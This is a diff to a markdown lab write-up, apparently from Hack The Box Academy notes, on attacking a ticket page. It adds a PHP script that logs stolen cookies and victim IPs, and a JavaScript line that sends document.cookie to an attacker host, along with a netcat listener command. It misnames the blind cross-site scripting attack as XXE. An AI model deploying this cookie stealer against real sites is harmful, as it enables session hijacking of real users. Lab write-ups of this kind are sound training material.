@@ -200,6 +200,7 @@ It has **XXE** vulnerability of message filed from **/ticket.php** page
 ```
 we will wait nc listener:
 `nc -lvnp 9000`
+file:///home/hunter/Pictures/Screenshots/Screenshot%20from%202023-10-05%2016-48-18.png![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/bb57ca15-c221-4834-8f5f-8cc4c451a736)
 
 After executing above payload we have:
 ```bash
@@ -215,5 +216,25 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-US
 ```
 Confirm it has vulnerability.
+It is blinf **XXE** to capture cookie document including admin we will use:
+## 1)index.php
+```bash
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+## 2)script.js
+```bash
+new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
+```
+
 
 
